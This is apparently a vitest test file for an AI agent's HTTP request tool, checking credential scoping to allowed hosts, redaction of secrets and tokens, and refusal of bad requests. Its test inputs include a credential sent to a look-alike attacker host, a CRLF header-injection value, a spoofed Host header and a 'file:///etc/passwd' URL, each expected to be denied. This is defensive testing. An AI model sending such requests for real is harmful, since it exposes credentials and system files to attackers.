import { randomBytes } from 'crypto'
import { mkdtempSync, rmSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import type { AxiosRequestConfig } from 'axios'
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { CredentialSend, CredentialSummary } from '../../shared/credentials'
import { registerHttpToolHandlers, type HttpSend } from './agentHttpToolHandlers'
import { AgentToolHandlerRegistry } from './agentToolHandlerRegistry'
import { CredentialRedactor } from './credentialRedaction'
import { CredentialUses } from './credentialUses'
import { ToolOutputStore } from './toolOutputStore'

const SECRET = `gen${randomBytes(16).toString('hex')}`
const USERNAME = `user${randomBytes(4).toString('hex')}`
const dirs: string[] = []

afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function credential(send: CredentialSend, kind: CredentialSummary['kind'] = 'secret') {
  return {
    id: 'one',
    alias: 'api-key',
    kind,
    description: '',
    usernameVisible: false,
    ask: 'never' as const,
    scope: {
      projects: 'all' as const,
      background: false,
      web: { hosts: ['api.example.com'], tokenHosts: ['data.example.com'], send }
    },
    createdAt: 1,
    updatedAt: 1,
    needsValue: false
  }
}

function setup(
  send: CredentialSend = { as: 'header', name: 'Authorization', prefix: 'Bearer ' },
  kind: CredentialSummary['kind'] = 'secret',
  response: { status?: number; contentType?: string; body?: string } = {}
) {
  const redactor = new CredentialRedactor()
  redactor.setSecrets([
    { alias: 'api-key', value: SECRET },
    { alias: 'api-key', value: USERNAME }
  ])
  const entry = credential(send, kind)
  const record = vi.fn()
  const uses = new CredentialUses(
    {
      list: () => [entry],
      resolve: () => ({
        summary: entry,
        values: kind === 'secret' ? { secret: SECRET } : { username: USERNAME, password: SECRET }
      }),
      record,
      setTransientSecrets: (secrets) =>
        redactor.setSecrets([
          { alias: 'api-key', value: SECRET },
          ...secrets.map(({ alias, value }) => ({ alias, value }))
        ])
    },
    () => ({ projectId: null, background: false })
  )
  const sent: Array<{ url: URL; config: AxiosRequestConfig }> = []
  const transport = vi.fn<HttpSend>(async (url, config) => {
    sent.push({ url: new URL(url.href), config })
    const body = Buffer.from(response.body ?? '{"ok":true}')
    return {
      status: response.status ?? 200,
      statusText: 'OK',
      headers: { 'content-type': response.contentType ?? 'application/json' },
      data: body.buffer.slice(body.byteOffset, body.byteOffset + body.byteLength) as ArrayBuffer,
      config: {} as never
    }
  })
  const dir = mkdtempSync(join(tmpdir(), 'sidekick-http-'))
  dirs.push(dir)
  const handlers = new AgentToolHandlerRegistry()
  registerHttpToolHandlers(handlers, {
    outputs: new ToolOutputStore(dir, Date.now, redactor),
    credentials: () => uses,
    send: transport
  })
  const call = (args: Record<string, unknown>) =>
    handlers.execute({
      name: 'http_request',
      title: 'Request',
      arguments: args,
      context: { runId: 'run', conversationId: 'chat', signal: new AbortController().signal }
    })
  return { call, sent, transport, record, redactor }
}

describe('http_request', () => {
  it('adds a header credential for its host, and the result never holds the value', async () => {
    const { call, sent } = setup(undefined, 'secret', {
      body: JSON.stringify({ echoed: `Bearer ${SECRET}` })
    })
    const result = await call({
      method: 'GET',
      url: 'https://api.example.com/v1/items',
      credential: 'api-key'
    })
    expect(result.status).toBe('success')
    expect((sent[0].config.headers as Record<string, string>).Authorization).toBe(
      `Bearer ${SECRET}`
    )
    expect(JSON.stringify(result)).not.toContain(SECRET)
    expect(result.modelContent).toContain('[secret: api-key]')
  })

  it('sends a sign-in as Basic authentication', async () => {
    const { call, sent } = setup({ as: 'basic' }, 'sign_in')
    await call({ method: 'GET', url: 'https://api.example.com/', credential: 'api-key' })
    expect((sent[0].config.headers as Record<string, string>).Authorization).toBe(
      `Basic ${Buffer.from(`${USERNAME}:${SECRET}`).toString('base64')}`
    )
  })

  it('places a value as a query parameter, a form field or a JSON field', async () => {
    const query = setup({ as: 'query', name: 'key' })
    await query.call({ method: 'GET', url: 'https://api.example.com/x?a=1', credential: 'api-key' })
    expect(query.sent[0].url.searchParams.get('key')).toBe(SECRET)

    const form = setup({ as: 'form', name: 'client_secret' })
    await form.call({
      method: 'POST',
      url: 'https://api.example.com/token',
      form: { grant_type: 'client_credentials' },
      credential: 'api-key'
    })
    expect(new URLSearchParams(String(form.sent[0].config.data)).get('client_secret')).toBe(SECRET)
    expect((form.sent[0].config.headers as Record<string, string>)['Content-Type']).toBe(
      'application/x-www-form-urlencoded'
    )

    const json = setup({ as: 'json', name: 'password', usernameName: 'user' }, 'sign_in')
    await json.call({
      method: 'POST',
      url: 'https://api.example.com/login',
      json: { remember: true },
      credential: 'api-key'
    })
    expect(JSON.parse(String(json.sent[0].config.data))).toEqual({
      remember: true,
      password: SECRET,
      user: USERNAME
    })
  })

  it('refuses to let the model set where the value goes itself', async () => {
    const { call, transport } = setup()
    const result = await call({
      method: 'GET',
      url: 'https://api.example.com/',
      headers: { authorization: 'Bearer something' },
      credential: 'api-key'
    })
    expect(result.status).toBe('error')
    expect(result.error?.message).toContain('Leave out the Authorization header')
    expect(transport).not.toHaveBeenCalled()
  })

  it('refuses a credential for another host without sending anything', async () => {
    const { call, transport, record } = setup()
    const result = await call({
      method: 'POST',
      url: 'https://api.example.com.evil.example/collect',
      credential: 'api-key'
    })
    expect(result.status).toBe('denied')
    expect(transport).not.toHaveBeenCalled()
    expect(record).toHaveBeenCalledWith('refused', expect.anything(), expect.anything())
  })

  it('turns returned tokens into aliases usable only with token hosts', async () => {
    const token = randomBytes(24).toString('hex')
    const { call, sent } = setup({ as: 'form', name: 'client_secret' }, 'secret', {
      body: JSON.stringify({ token_type: 'Bearer', expires_in: 3600, access_token: token })
    })
    const exchange = await call({
      method: 'POST',
      url: 'https://api.example.com/token',
      form: { grant_type: 'client_credentials' },
      credential: 'api-key'
    })
    expect(exchange.modelContent).toContain('"access_token": "api-key~1"')
    expect(JSON.stringify(exchange)).not.toContain(token)

    const api = await call({
      method: 'GET',
      url: 'https://data.example.com/v1/products',
      credential: 'api-key~1'
    })
    expect(api.status).toBe('success')
    expect((sent[1].config.headers as Record<string, string>).Authorization).toBe(`Bearer ${token}`)
    const leak = await call({
      method: 'GET',
      url: 'https://api.example.com/v1',
      credential: 'api-key~1'
    })
    expect(leak.status).toBe('denied')
  })

  it.each([
    [{ method: 'GET', url: 'https://api.example.com/', body: 'x' }, 'carry no body'],
    [{ method: 'POST', url: 'https://api.example.com/', body: 'x', json: {} }, 'at most one'],
    [
      { method: 'GET', url: 'https://api.example.com/', headers: { 'X-A': 'b\r\nC: d' } },
      'line break'
    ],
    [{ method: 'GET', url: 'https://api.example.com/', headers: { Host: 'evil.example' } }, 'Host'],
    [{ method: 'GET', url: 'file:///etc/passwd' }, 'http or https'],
    [{ method: 'TRACE', url: 'https://api.example.com/' }, 'method']
  ])('refuses %j', async (args, message) => {
    const { call, transport } = setup()
    const result = await call(args)
    expect(result.status).toBe('error')
    expect(result.error?.message).toContain(message)
    expect(transport).not.toHaveBeenCalled()
  })

  it('reports a failed request by its message alone', async () => {
    const { call } = setup()
    const failing = vi.fn<HttpSend>(async () => {
      const error = new Error('connect ETIMEDOUT') as Error & { config?: unknown }
      error.config = { headers: { Authorization: `Bearer ${SECRET}` } }
      throw error
    })
    const handlers = new AgentToolHandlerRegistry()
    const dir = mkdtempSync(join(tmpdir(), 'sidekick-http-'))
    dirs.push(dir)
    registerHttpToolHandlers(handlers, { outputs: new ToolOutputStore(dir), send: failing })
    const result = await handlers.execute({
      name: 'http_request',
      title: 'Request',
      arguments: { method: 'GET', url: 'https://api.example.com/' },
      context: { runId: 'run', signal: new AbortController().signal }
    })
    expect(result.error?.message).toBe('The request failed: connect ETIMEDOUT')
    expect(call).toBeDefined()
  })
})
